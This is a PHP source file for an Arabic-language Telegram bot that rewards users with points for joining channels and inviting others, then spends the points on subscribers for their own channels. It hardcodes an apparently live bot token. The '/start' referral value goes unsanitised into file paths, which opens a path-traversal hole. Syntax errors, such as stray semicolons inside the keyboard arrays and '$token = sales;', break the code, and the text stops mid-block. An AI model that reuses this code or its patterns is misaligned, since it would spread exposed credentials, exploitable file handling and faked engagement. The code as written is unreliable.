<?php
ob_start();
$MY_KING= "7879762512:AAHMJaF3Got83VDF9Gm9IdaPAcsC6oImc4s";
define('MY_KING',$MY_KING);
echo file_get_contents("https://api.telegram.org/bot".MY_KING."/setwebhook?url=".$_SERVER['SERVER_NAME']."".$_SERVER['SCRIPT_NAME']);
function bot($method,$datas=[]){
$url = "https://api.telegram.org/bot".MY_KING."/".$method;
$ch = curl_init();
curl_setopt($ch,CURLOPT_URL,$url);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
curl_setopt($ch,CURLOPT_POSTFIELDS,$datas);
$res = curl_exec($ch);
if(curl_error($ch)){
var_dump(curl_error($ch));
}
else
{
return json_decode($res);}}
####@KING @php_aba ####
$Dev = array("ا","7073317127","ايديك");
$botuser = "@BOOT0bot"; #بوتك
$channel = "B0OT_m"; #قناتك
$admin = 7073317127; #ايديك
$chidd = "-  G0H0GH "; // ايدي القناة الي ترسل بيها لهدايا
$Devv = "7073317127";////ايديك
$token = sales;
$update = json_decode(file_get_contents('php://input'));
$message = $update->message;
$from_id = $message->from->id;
$chat_id = $message->chat->id;
$message_id = $message->message_id;
$first_name = $message->from->first_name;
$last_name = $message->from->last_name;
$username = $message->from->username;
$text = $message->text;
$firstname = $update->callback_query->from->first_name;
$usernames = $update->callback_query->from->username;
$chatid = $update->callback_query->message->chat->id;
$fromid = $update->callback_query->from->id;
$name = $update->message->from->first_name;
$membercall = $update->callback_query->id;
$data = $update->callback_query->data;
$messageid = $update->callback_query->message->message_id;
$tc = $update->message->chat->type;
$gpname = $update->callback_query->message->chat->title;
$forward_from = $update->message->forward_from;
$forward_from_id = $forward_from->id;
$forward_from_username = $forward_from->username;
$forward_from_first_name = $forward_from->first_name;
$reply = $update->message->reply_to_message->forward_from->id;
$reply_username = $update->message->reply_to_message->forward_from->username;
$reply_first = $update->message->reply_to_message->forward_from->first_name;
$forchannel = json_decode(file_get_contents("https://api.telegram.org/bot".$token."/getChatMember?chat_id=@".$channel."&user_id=".$from_id));
$tch = $forchannel->result->status;
$forchannelq = json_decode(file_get_contents("https://api.telegram.org/bot".$token."/getChatMember?chat_id=@".$channel."&user_id=".$fromid));
$tchq = $forchannelq->result->status;
function SendMessage($chat_id, $text){
bot ('sendMessage',[
'chat_id'=>$chat_id,
'text'=>$text,
'parse_mode'=>'MarkDown']);
}
 function Forward($berekoja,$azchejaei,$kodompayam)
{
bot ('ForwardMessage',[
'chat_id'=>$berekoja,
'from_chat_id'=>$azchejaei,
'message_id'=>$kodompayam
]);
}
function getUserProfilePhotos($token,$from_id) {
$url = 'https://api.telegram.org/bot'.$token.'/getUserProfilePhotos?user_id='.$from_id;
$result = file_get_contents($url);
$result = json_decode ($result);
$result = $result->result;
return $result;
}
function getChatMembersCount($chat_id,$token) {
$url = 'https://api.telegram.org/bot'.$token.'/getChatMembersCount?chat_id=@'.$chat_id;
$result = file_get_contents($url);
$result = json_decode ($result);
$result = $result->result;
return $result;
}
function getChatstats($chatid,$token) {
$url = 'https://api.telegram.org/bot'.$token.'/getChatAdministrators?chat_id='.$chatid;
$result = file_get_contents($url);
$result = json_decode ($result);
$result = $result->ok;
return $result;
}
@$user = json_decode(file_get_contents("data/user.json"),true);
@$KING = json_decode(file_get_contents("data/$from_id.json"),true);
@$sales = json_decode(file_get_contents("data/$fromid.json"),true);
mkdir("data");
if(!in_array($from_id, $user["userlist"]) == true) {
$user["userlist"][]="$from_id";
$user = json_encode($user,true);
file_put_contents("data/user.json",$user);
}
if(in_array($from_id, $user["blocklist"])) {
bot ('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"- انت محظور من البوت ياعزيزي ، ⚖ !
- بسبب عدم اتباعك قوانين البوت ؛ لا تقم بارسال الرسائل مرة اخرى ، 🔱
﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎",
'reply_markup'=>json_encode(['KeyboardRemove'=>[
],'remove_keyboard'=>true
])
]);
}
if($text=="/start" && $tc == "private"){	
if(in_array($from_id, $user["userlist"]) == true) {
@$sales = json_decode(file_get_contents("data/$fromid.json"),true);
$coin = $KING["userfild"]["$from_id"]["coin"];
bot ('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
• مرحبا بك في بوت تمويل ماجد 
⌁︙زيـادة مشتركيـن حقيقين للقناه
⌁︙اسرع بـوت للتمويل
⌁︙البوت امـن بنسبه كبيره
⌁︙نحن غير مسؤلين عن اي تصرف
• اجمع النقاط و استبدلها بالعضاء
• نقاطك ↫ ".$coin."🍪
",
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"‹ خدمات الاعضاء ›",'callback_data'=>'takemember']],
[['text'=>"‹ تجميع ›",'callback_data'=>'takecoin'],['text'=>"‹ حسابك ›",'callback_data'=>'a8']],
[['text'=>"‹ قنواتك ›",'callback_data'=>'order'],['text'=>"‹ شروط البوت ›",'callback_data'=>'m1']],
[['text'=>"‹ قناة البوت ›",'url'=>"https://t.me/php0files"]];
[['text'=>"‹ طلباتك ›",'callback_data'=>'m5'],['text'=>"‹ تحويل نقاط ›",'callback_data'=>'sendcoin']],
[['text'=>"‹ المطور ›",'url'=>'t.me/KKIN9']],
],
'resize_keyboard'=>true,
])
]);
$KING["userfild"]["$from_id"]["file"]="none";
$KING = json_encode($KING,true);
file_put_contents("data/$from_id.json",$KING);	
}
else
{
bot ('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
• مرحبا بك في بوت تمويل ماجد 
⌁︙زيـادة مشتركيـن حقيقين للقناه
⌁︙اسرع بـوت للتمويل
⌁︙البوت امـن بنسبه كبيره
⌁︙نحن غير مسؤلين عن اي تصرف
• اجمع النقاط و استبدلها بالعضاء
• نقاطك ↫ ".$coin."🍪",
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"‹ خدمات الاعضاء ›",'callback_data'=>'takemember']],
[['text'=>"‹ تجميع ›",'callback_data'=>'takecoin'],['text'=>"‹ حسابك ›",'callback_data'=>'a8']],
[['text'=>"‹ قنواتك ›",'callback_data'=>'order'],['text'=>"‹ شروط البوت ›",'callback_data'=>'m1']],
[['text'=>"‹ قناة البوت ›",'url'=>"https://t.me/php0files"]];
[['text'=>"‹ طلباتك ›",'callback_data'=>'m5'],['text'=>"‹ تحويل نقاط ›",'callback_data'=>'sendcoin']],
[['text'=>"‹ المطور ›",'url'=>'t.me/KKIN9']],
],'resize_keyboard'=>true,])]);
$KING = json_decode(file_get_contents("data/$from_id.json"),true);	
$KING["userfild"]["$from_id"]["invite"]="0";
$KING["userfild"]["$from_id"]["coin"]="0";
$KING["userfild"]["$from_id"]["setchannel"]="لا يوجد !";
$KING["userfild"]["$from_id"]["setmember"]="لا يوجد !";
$KING = json_encode($KING,true);
file_put_contents("data/$from_id.json",$KING);
}
}
elseif(strpos($text , '/start ') !== false) {
$start = str_replace("/start ","",$text);
if(in_array($from_id, $user["userlist"])) {
bot ('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
• مرحبا بك في بوت تمويل ماجد 
⌁︙زيـادة مشتركيـن حقيقين للقناه
⌁︙اسرع بـوت للتمويل
⌁︙البوت امـن بنسبه كبيره
⌁︙نحن غير مسؤلين عن اي تصرف
• اجمع النقاط و استبدلها بالعضاء
• نقاطك ↫ ".$coin."🍪",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"‹ خدمات الاعضاء ›",'callback_data'=>'takemember']],
[['text'=>"‹ تجميع ›",'callback_data'=>'takecoin'],['text'=>"‹ حسابك ›",'callback_data'=>'a8']],
[['text'=>"‹ قنواتك ›",'callback_data'=>'order'],['text'=>"‹ شروط البوت ›",'callback_data'=>'m1']],
[['text'=>"‹ قناة البوت ›",'url'=>"https://t.me/php0files"]];
[['text'=>"‹ طلباتك ›",'callback_data'=>'m5'],['text'=>"‹ تحويل نقاط ›",'callback_data'=>'sendcoin']],
[['text'=>"‹ المطور ›",'url'=>'t.me/KKIN9']],
],
'resize_keyboard'=>true,
])
]);	
}
else 
{
$KING = json_decode(file_get_contents("data/$from_id.json"),true);	
$inuser = json_decode(file_get_contents("data/$start.json"),true);
$member = $inuser["userfild"]["$start"]["invite"];
$coin = $inuser["userfild"]["$start"]["coin"];
$memberplus = $member + 1;
$coinplus = $coin+ 5;
bot ('sendmessage',[
'chat_id'=>$start,
'text'=>"
⌁︙تم دخول شخص الي رابط الدعوه
⌁︙عدد دعواتك ↫ $memberplus
⌁︙نقاطك ↫ $coinplus",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"رجوع 🔙",'callback_data'=>'panel']
],
 ]
])
 ]);
 bot ('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
• مرحبا بك في بوت تمويل ماجد
⌁︙زيـادة مشتركيـن حقيقين للقناه
⌁︙اسرع بـوت للتمويل
⌁︙البوت امـن بنسبه كبيره
⌁︙نحن غير مسؤلين عن اي تصرف
• اجمع النقاط و استبدلها بالعضاء
• نقاطك ↫ ".$coin."🍪",
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
	'reply_markup'=>json_encode([
	'inline_keyboard'=>[
[['text'=>"‹ خدمات الاعضاء ›",'callback_data'=>'takemember']],
[['text'=>"‹ تجميع ›",'callback_data'=>'takecoin'],['text'=>"‹ حسابك ›",'callback_data'=>'a8']],
[['text'=>"‹ قنواتك ›",'callback_data'=>'order'],['text'=>"‹ شروط البوت ›",'callback_data'=>'m1']],
[['text'=>"‹ قناة البوت ›",'url'=>"https://t.me/php0files"]];
[['text'=>"‹ طلباتك ›",'callback_data'=>'m5'],['text'=>"‹ تحويل نقاط ›",'callback_data'=>'sendcoin']],
[['text'=>"‹ المطور ›",'url'=>'t.me/KKIN9']],
],'resize_keyboard'=>true,])]);	
$inuser["userfild"]["$start"]["invite"]="$memberplus";
$inuser["userfild"]["$start"]["coin"]="$coinplus";
$inuser = json_encode($inuser,true);
file_put_contents("data/$start.json",$inuser);
$KING["userfild"]["$from_id"]["invite"]="0";
$KING["userfild"]["$from_id"]["coin"]="0";
$KING["userfild"]["$from_id"]["setchannel"]="لا يوجد !";
$KING["userfild"]["$from_id"]["setmember"]="لا يوجد !";
$KING["userfild"]["$from_id"]["inviter"]="$start";
$KING = json_encode($KING,true);
file_put_contents("data/$from_id.json",$KING);	
}
}
elseif($sales["userfild"]["$fromid"]["channeljoin"] == true){
$allchannel = $sales["userfild"]["$fromid"]["channeljoin"];
for($z = 0;$z <= count($allchannel) -1;$z++){
$getchannel = json_decode(file_get_contents("https://api.telegram.org/bot".$token."/getChatMember?chat_id=@".$allchannel[$z]."&user_id=".$fromid));
$okchannel = $getchannel->result->status;
if($okchannel != 'member' && $okchannel != 'creator' && $okchannel != 'administrator'){
break;
}
}
if($allchannel[$z] == true){
 bot ('answercallbackquery', [
'callback_query_id' =>$membercall,
'text' => "- بسبب مغادرة القناة ؛ @$allchannel[$z] ، تم خصم 2 من نقاطك ، ⚠️ .",
'show_alert' =>false
 ]);
unset($sales["userfild"]["$fromid"]["channeljoin"][$z]);
$sales["userfild"]["$fromid"]["channeljoin"]=array_values($sales["userfild"]["$fromid"]["channeljoin"]);
$coin = $sales["userfild"]["$fromid"]["coin"];
$pluscoin = $coin - 2;
$sales["userfild"]["$fromid"]["coin"]="$pluscoin";
$sales = json_encode($sales,true);
file_put_contents("data/$fromid.json",$sales);
}
if($allchannel[$z] == true){
 bot ('SendMessage', [
'chat_id'=>$chatid,
'text' => "
⚠️] عليك الاشتراك في القنوات اولا

*هذه القنوات ليست اعلان بل لانك غادرت منهم اثناء تمويلهم *

•@$allchannel[$z]
",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"‹ تحديث ›",'callback_data'=>'takecoin']]
]
])
]);
unset($sales["userfild"]["$fromid"]["channeljoin"][$z]);
$sales["userfild"]["$fromid"]["channeljoin"]=array_values($sales["userfild"]["$fromid"]["channeljoin"]);
$coin = $sales["userfild"]["$fromid"]["coin"];
$pluscoin = $coin + 2;
$sales["userfild"]["$fromid"]["coin"]="$pluscoin";
$sales = json_encode($sales,true);
file_put_contents("data/$fromid.json",$sales);
}
}

if($data=="panel"){
$coin = $sales["userfild"]["$fromid"]["coin"];
bot ('editmessagetext',[
'chat_id'=>$chatid,
 'message_id'=>$messageid,
'text'=>"
• مرحبا بك في بوت تمويل ماج
⌁︙زيـادة مشتركيـن حقيقين للقناه
⌁︙اسرع بـوت للتمويل
⌁︙البوت امـن بنسبه كبيره
⌁︙نحن غير مسؤلين عن اي تصرف
• اجمع النقاط و استبدلها بالعضاء
• نقاطك ↫ ".$coin."🍪",
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"‹ خدمات الاعضاء ›",'callback_data'=>'takemember']],
[['text'=>"‹ تجميع ›",'callback_data'=>'takecoin'],['text'=>"‹ حسابك ›",'callback_data'=>'a8']],
[['text'=>"‹ قنواتك ›",'callback_data'=>'order'],['text'=>"‹ شروط البوت ›",'callback_data'=>'m1']],
[['text'=>"‹ قناة البوت ›",'url'=>"https://t.me/php0files"]];
[['text'=>"‹ طلباتك ›",'callback_data'=>'m5'],['text'=>"‹ تحويل نقاط ›",'callback_data'=>'sendcoin']],
[['text'=>"‹ المطور ›",'url'=>'t.me/KKIN9']],
],'resize_keyboard'=>true,])]);
$sales = json_decode(file_get_contents("data/$fromid.json"),true);
$sales["userfild"]["$fromid"]["file"]="none";
$sales = json_encode($sales,true);
file_put_contents("data/$fromid.json",$sales);
}
elseif($data == "takecoin"){
$rules = $sales["userfild"]["$fromid"]["acceptrules"];
$coin = $sales["userfild"]["$fromid"]["coin"];
if($rules == false){
bot ('editmessagetext',[
'chat_id'=>$chatid,
 'message_id'=>$messageid,
'text'=>"
(🔰) تجميع نقاط",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"‹ الاشتراك بالقنوات ›",'callback_data'=>'takecoin']],
[['text'=>"‹ رابط الدعوه ›",'callback_data'=>'a5']],
[['text'=>"‹ الهديه اليوميه ›",'callback_data'=>'a6']],
[['text'=>"رجوع 🔙",'callback_data'=>'panel']],[
],
]
])
]);	
$sales["userfild"]["$fromid"]["acceptrules"]="true";
$sales = json_encode($sales,true);
file_put_contents("data/$fromid.json",$sales);
}
else
{
if($tchq != 'member' && $tchq != 'creator' && $tchq != 'administrator'){
$join = $sales["userfild"]["$fromid"]["canceljoin"];
if($join == false){
bot ('editmessagetext',[
'chat_id'=>$chatid,
 'message_id'=>$messageid,
'text'=>"أشترك في قناة البوت الاساسية وأحصل
على 10 نقاط هدية مجانية من البوت 😉
القناة » @$channel",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"تحقق من الانضمام ♻️",'callback_data'=>'mainchannel']],
[['text'=>"أبلاغ 📛",'callback_data'=>'badchannel'],['text'=>"تخطي القناة ⏩",'callback_data'=>'takecoin']],
[['text'=>"رجوع 🔙",'callback_data'=>'panel']],
 ]
])
]);
$sales["userfild"]["$fromid"]["canceljoin"]="true";
$sales = json_encode($sales,true);
file_put_contents("data/$fromid.json",$sales);		
}
else
{
$allchannel = $user["channellist"];
for($z = 0;$z <= count($allchannel);$z++){
$getchannel = json_decode(file_get_contents("https://api.telegram.org/bot".$token."/getChatMember?chat_id=".$allchannel[$z]."&user_id=".$fromid));
$okchannel = $getchannel->result->status;
if($okchannel != 'member' && $okchannel != 'creator' && $okchannel != 'administrator'){
break;
}
}
if ($allchannel[$z] == true){
$coin = $sales["userfild"]["$fromid"]["coin"];
$coin = $sales["userfild"]["$fromid"]["coin"];
$url = file_get_contents("https://api.telegram.org/bot$token/getChat?chat_id=$allchannel[$z]");
$getchat = json_decode($url, true);
$name = $getchat["result"]["title"]; 
$username = $getchat["result"]["username"]; 
$id = $getchat["result"]["id"]; 
$description = $getchat["result"]["description"];
bot ('editmessagetext',[
'chat_id'=>$chatid,
 'message_id'=>$messageid,
'text'=>"نقاطك : ($coin)💰
انضم بـ @$username 
وستحصل على 2 نقاط 🌝✌🏻
يرجى الابلاغ عن القنوات المخالفة 📛
➖➖➖➖➖➖➖➖➖➖➖➖",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"تحقق من الانضمام ♻️",'callback_data'=>'truechannel']],
[['text'=>"أبلاغ 📛",'callback_data'=>'badchannel'],['text'=>"تخطي القناة ⏩",'callback_data'=>'takecoin']],
[['text'=>"رجوع 🔙",'callback_data'=>'panel']],
 ]
])
]);
$sales["userfild"]["$fromid"]["getjoin"]="$username";
$sales["userfild"]["$fromid"]["arraychannel"]="$z";
$sales = json_encode($sales,true);
file_put_contents("data/$fromid.json",$sales);	
}
else
{
bot('editmessagetext',[
'chat_id'=>$chatid,
'message_id'=>$messageid,
'text'=>"انتهت القنوات المضافة يمكنك الان
مشاركة رابطك مع صديق والحصول
على 5 نقاط 😃
---------------------",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"تحديث القنوات 😇",'callback_data'=>'takecoin'],['text'=>"رجوع 🔙",'callback_data'=>'panel']],
[['text'=>"تجميع باستخدام الرابط 💎",'callback_data'=>'member']],
]
])]);
}
}
}
else
{
$allchannel = $user["channellist"];
for($z = 0;$z <= count($allchannel);$z++){
$getchannel = json_decode(file_get_contents("https://api.telegram.org/bot".$token."/getChatMember?chat_id=".$allchannel[$z]."&user_id=".$fromid));
$okchannel = $getchannel->result->status;
if($okchannel != 'member' && $okchannel != 'creator' && $okchannel != 'administrator'){
break;
}
}
if ($allchannel[$z] == true){
$coin = $sales["userfild"]["$fromid"]["coin"];
$url = file_get_contents("https://api.telegram.org/bot$token/getChat?chat_id=$allchannel[$z]");
$getchat = json_decode($url, true);
$name = $getchat["result"]["title"]; 
$username = $getchat["result"]["username"]; 
$id = $getchat["result"]["id"]; 
$description = $getchat["result"]["description"];
bot ('editmessagetext',[
'chat_id'=>$chatid,
 'message_id'=>$messageid,
'text'=>"نقاطك : ($coin)💰
انضم بـ @$username 
وستحصل على 2 نقاط 🌝✌🏻
يرجى الابلاغ عن القنوات المخالفة 📛
➖➖➖➖➖➖➖➖➖➖➖➖",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"تحقق من الانضمام ♻️",'callback_data'=>'truechannel']],
[['text'=>"أبلاغ 📛",'callback_data'=>'badchannel'],['text'=>"تخطي القناة ⏩",'callback_data'=>'takecoin']],
[['text'=>"رجوع 🔙",'callback_data'=>'panel']],
 ]
])
]);
$sales["userfild"]["$fromid"]["getjoin"]="$username";
$sales["userfild"]["$fromid"]["arraychannel"]="$z";
$sales = json_encode($sales,true);
file_put_contents("data/$fromid.json",$sales);
}
else
{
bot ('editmessagetext',[
'chat_id'=>$chatid,
 'message_id'=>$messageid,
'text'=>"انتهت القنوات المضافة يمكنك الان
مشاركة رابطك مع صديق والحصول
على 5 نقاط 😃
-------------------",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"تحديث القنوات 😇",'callback_data'=>'takecoin'],['text'=>"رجوع 🔙",'callback_data'=>'panel']],
[['text'=>"تجميع باستخدام الرابط 💎",'callback_data'=>'member']],
]
])
]);
}
}
}
}
elseif($data=="truechannel" ){
$getjoinchannel = $sales["userfild"]["$fromid"]["getjoin"];
$getchannel = json_decode(file_get_contents("https://api.telegram.org/bot".$token."/getChatMember?chat_id=@".$getjoinchannel."&user_id=".$fromid));
$okchannel = $getchannel->result->status;
if($okchannel != 'member' && $okchannel != 'creator' && $okchannel != 'administrator'){
bot ('answercallbackquery', [
'callback_query_id' =>$membercall,
'text' => "• قم بألاشتراك في القناة اولا ؛ ثم اضغط على التالي ، 🔱 !",
'show_alert' =>true
]);
}
else
{
 bot ('answercallbackquery', [
'callback_query_id' =>$membercall,
'text' => "حصلت على نقطــتين 🥺🤸‍♀",
'show_alert' =>false
]);
$sales = json_decode(file_get_contents("data/$fromid.json"),true);
$coin = $sales["userfild"]["$fromid"]["coin"];
$arraychannel = $sales["userfild"]["$fromid"]["arraychannel"];
$coinchannel = $user["setmemberlist"];
$channelincoin = $coinchannel[$arraychannel];
$downchannel = $channelincoin - 1;
$pluscoin = $coin + 2;
$sales["userfild"]["$fromid"]["channeljoin"][]="$getjoinchannel";
$sales["userfild"]["$fromid"]["coin"]="$pluscoin";
$sales = json_encode($sales,true);
file_put_contents("data/$fromid.json",$sales);
if($downchannel > 0){
@$user = json_decode(file_get_contents("data/user.json"),true);
$user["setmemberlist"]["$arraychannel"]="$downchannel";
$user["setmemberlist"]=array_values($user["setmemberlist"]); 
$user = json_encode($user,true);
file_put_contents("data/user.json",$user);
@$user = json_decode(file_get_contents("data/user.json"),true);
$allchannel = $user["channellist"];
for($z = 0;$z <= count($allchannel);$z++){
$getchannel = json_decode(file_get_contents("https://api.telegram.org/bot".$token."/getChatMember?chat_id=".$allchannel[$z]."&user_id=".$fromid));
$okchannel = $getchannel->result->status;
if($okchannel != 'member' && $okchannel != 'creator' && $okchannel != 'administrator'){
break;
}
}
if ($allchannel[$z] == true){
$coin = $sales["userfild"]["$fromid"]["coin"];
$url = file_get_contents("https://api.telegram.org/bot$token/getChat?chat_id=$allchannel[$z]");
$getchat = json_decode($url, true);
$name = $getchat["result"]["title"]; 
$username = $getchat["result"]["username"]; 
$id = $getchat["result"]["id"]; 
$description = $getchat["result"]["description"];
bot ('editmessagetext',[
'chat_id'=>$chatid,
 'message_id'=>$messageid,
'text'=>"نقاطك : ($coin)💰
انضم بـ @$username 
وستحصل على 2 نقاط 🌝✌🏻
يرجى الابلاغ عن القنوات المخالفة 📛
➖➖➖➖➖➖➖➖➖➖➖➖",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"تحقق من الانضمام ♻️",'callback_data'=>'truechannel']],
[['text'=>"أبلاغ 📛",'callback_data'=>'badchannel'],['text'=>"تخطي القناة ⏩",'callback_data'=>'takecoin']],
[['text'=>"رجوع 🔙",'callback_data'=>'panel']],
]
])
]);
$sales = json_decode(file_get_contents("data/$fromid.json"),true);
$sales["userfild"]["$fromid"]["getjoin"]="$username";
$sales["userfild"]["$fromid"]["arraychannel"]="$z";
$sales = json_encode($sales,true);
file_put_contents("data/$fromid.json",$sales);
}
else
{
bot ('editmessagetext',[
'chat_id'=>$chatid,
 'message_id'=>$messageid,
'text'=>"انتهت القنوات المضافة يمكنك الان
مشاركة رابطك مع صديق والحصول
على 5 نقاط 😃",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"تحديث القنوات 😇",'callback_data'=>'takecoin'],['text'=>"رجوع 🔙",'callback_data'=>'panel']],
[['text'=>"تجميع باستخدام الرابط 💎",'callback_data'=>'member']],
]
])
]);
}
}
else
{
unset($user["setmemberlist"]["$arraychannel"]);
unset($user["channellist"]["$arraychannel"]);
$user["channellist"]=array_values($user["channellist"]); 
$user["setmemberlist"]=array_values($user["setmemberlist"]);
$user = json_encode($user,true);
file_put_contents("data/user.json",$user);
@$user = json_decode(file_get_contents("data/user.json"),true);
$allchannel = $user["channellist"];
for($z = 0;$z <= count($allchannel);$z++){
$getchannel = json_decode(file_get_contents("https://api.telegram.org/bot".$token."/getChatMember?chat_id=".$allchannel[$z]."&user_id=".$fromid));
$okchannel = $getchannel->result->status;
if($okchannel != 'member' && $okchannel != 'creator' && $okchannel != 'administrator'){
break;
}
}
if ($allchannel[$z] == true){
$coin = $sales["userfild"]["$fromid"]["coin"];
$url = file_get_contents("https://api.telegram.org/bot$token/getChat?chat_id=$allchannel[$z]");
$getchat = json_decode($url, true);
$name = $getchat["result"]["title"]; 
$username = $getchat["result"]["username"]; 
$id = $getchat["result"]["id"]; 
$description = $getchat["result"]["description"];
bot ('editmessagetext',[
'chat_id'=>$chatid,
 'message_id'=>$messageid,
'text'=>"نقاطك : ($coin)💰
انضم بـ @$username 
وستحصل على 2 نقاط 🌝✌🏻
يرجى الابلاغ عن القنوات المخالفة 📛
➖➖➖➖➖➖➖➖➖➖➖➖",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"تحقق من الانضمام ♻️",'callback_data'=>'truechannel']],
[['text'=>"أبلاغ 📛",'callback_data'=>'badchannel'],['text'=>"تخطي القناة ⏩",'callback_data'=>'takecoin']],
[['text'=>"رجوع 🔙",'callback_data'=>'panel']],]
])
]);
$sales = json_decode(file_get_contents("data/$fromid.json"),true);
$sales["userfild"]["$fromid"]["getjoin"]="$username";
$sales["userfild"]["$fromid"]["arraychannel"]="$z";
$sales = json_encode($sales,true);
file_put_contents("data/$fromid.json",$sales);
}
else
{
bot ('editmessagetext',[
'chat_id'=>$chatid,
 'message_id'=>$messageid,
'text'=>"انتهت القنوات المضافة يمكنك الان
مشاركة رابطك مع صديق والحصول
على 5 نقاط 😃",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"تحديث القنوات 😇",'callback_data'=>'takecoin'],['text'=>"رجوع 🔙",'callback_data'=>'panel']],
[['text'=>"تجميع باستخدام الرابط 💎",'callback_data'=>'member']],
]
])
]);
}
}
}
}
elseif($data=="nextchannel" ){
 bot ('answercallbackquery', [
'callback_query_id' =>$membercall,
'text' => "- انتظر قليلا ... 📌 !",
'show_alert' =>false
]);
$arraychannel = $sales["userfild"]["$fromid"]["arraychannel"];
$plusarraychannel = $arraychannel + 1 ;
$allchannel = $user["channellist"];
for($z = $plusarraychannel;$z <= count($allchannel);$z++){
$getchannel = json_decode(file_get_contents("https://api.telegram.org/bot".$token."/getChatMember?chat_id=".$allchannel[$z]."&user_id=".$fromid));
$okchannel = $getchannel->result->status;
if($okchannel != 'member' && $okchannel != 'creator' && $okchannel != 'administrator'){
break;
}
}
if ($allchannel[$z] == true){
$coin = $sales["userfild"]["$fromid"]["coin"];
$url = file_get_contents("https://api.telegram.org/bot$token/getChat?chat_id=$allchannel[$z]");
$getchat = json_decode($url, true);
$name = $getchat["result"]["title"]; 
$username = $getchat["result"]["username"]; 
$id = $getchat["result"]["id"]; 
$description = $getchat["result"]["description"];
bot ('editmessagetext',[
'chat_id'=>$chatid,
 'message_id'=>$messageid,
'text'=>"نقاطك : ($coin)💰
انضم بـ @$username 
وستحصل على 2 نقاط 🌝✌🏻
يرجى الابلاغ عن القنوات المخالفة 📛
➖➖➖➖➖➖➖➖➖➖➖➖",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"تحقق من الانضمام ♻️",'callback_data'=>'truechannel']],
[['text'=>"أبلاغ 📛",'callback_data'=>'badchannel'],['text'=>"تخطي القناة ⏩",'callback_data'=>'takecoin']],
[['text'=>"رجوع 🔙",'callback_data'=>'panel']],
 ]
])
]);
$sales["userfild"]["$fromid"]["getjoin"]="$username";
$sales["userfild"]["$fromid"]["arraychannel"]="$z";
$sales = json_encode($sales,true);
file_put_contents("data/$fromid.json",$sales);
}
else
{
bot ('editmessagetext',[
'chat_id'=>$chatid,
 'message_id'=>$messageid,
'text'=>"- انتهت القنوات المضافةه ؛ يرجى المحاولة مرى اخرة في تجميع النقاط ، او قم بمشاركة الرابط بدل عن الاشتراك في القنوات ، 📻 ' !",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"تحديث القنوات 😇",'callback_data'=>'takecoin'],['text'=>"رجوع 🔙",'callback_data'=>'panel']],
[['text'=>"تجميع باستخدام الرابط 💎",'callback_data'=>'member']],
]
])
]);
}
}
elseif($data=="mainchannel" ){
$getchannel = json_decode(file_get_contents("https://api.telegram.org/bot".$token."/getChatMember?chat_id=@".$channel."&user_id=".$fromid));
$okchannel = $getchannel->result->status;
if($okchannel != 'member' && $okchannel != 'creator' && $okchannel != 'administrator'){
bot ('answercallbackquery', [
'callback_query_id' =>$membercall,
'text' => "• قم بألاشتراك في القناة اولا ؛ ثم اضغط على التالي ، 🔱 !",
'show_alert' =>true
]);
}
else
{
 bot ('answercallbackquery', [
'callback_query_id' =>$membercall,
'text' => "حصلت على نقطــتين 🥺🤸‍♀",
'show_alert' =>false
]);
$coin = $sales["userfild"]["$fromid"]["coin"];
$pluscoin = $coin + 2;
$sales["userfild"]["$fromid"]["coin"]="$pluscoin";
$sales["userfild"]["$fromid"]["channeljoin"][]="$channel";
$sales = json_encode($sales,true);
file_put_contents("data/$fromid.json",$sales);
@$user = json_decode(file_get_contents("data/user.json"),true);
$allchannel = $user["channellist"];
for($z = 0;$z <= count($allchannel);$z++){
$getchannel = json_decode(file_get_contents("https://api.telegram.org/bot".$token."/getChatMember?chat_id=".$allchannel[$z]."&user_id=".$fromid));
$okchannel = $getchannel->result->status;
if($okchannel != 'member' && $okchannel != 'creator' && $okchannel != 'administrator'){
$omm = $allchannel[$z];
break;
}
}
if ($allchannel[$z] == true){
$coin = $sales["userfild"]["$fromid"]["coin"];
$url = file_get_contents("https://api.telegram.org/bot$token/getChat?chat_id=$allchannel[$z]");
$getchat = json_decode($url, true);
$name = $getchat["result"]["title"]; 
$username = $getchat["result"]["username"]; 
$id = $getchat["result"]["id"]; 
$description = $getchat["result"]["description"];
bot ('editmessagetext',[
'chat_id'=>$chatid,
 'message_id'=>$messageid,
'text'=>"نقاطك : ($coin)💰
انضم بـ @$username 
وستحصل على 2 نقاط 🌝✌🏻
يرجى الابلاغ عن القنوات المخالفة 📛
➖➖➖➖➖➖➖➖➖➖➖➖",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"تحقق من الانضمام ♻️",'callback_data'=>'truechannel']],
[['text'=>"أبلاغ 📛",'callback_data'=>'badchannel'],['text'=>"تخطي القناة ⏩",'callback_data'=>'takecoin']],
[['text'=>"رجوع 🔙",'callback_data'=>'panel']],
 ]
])
]);
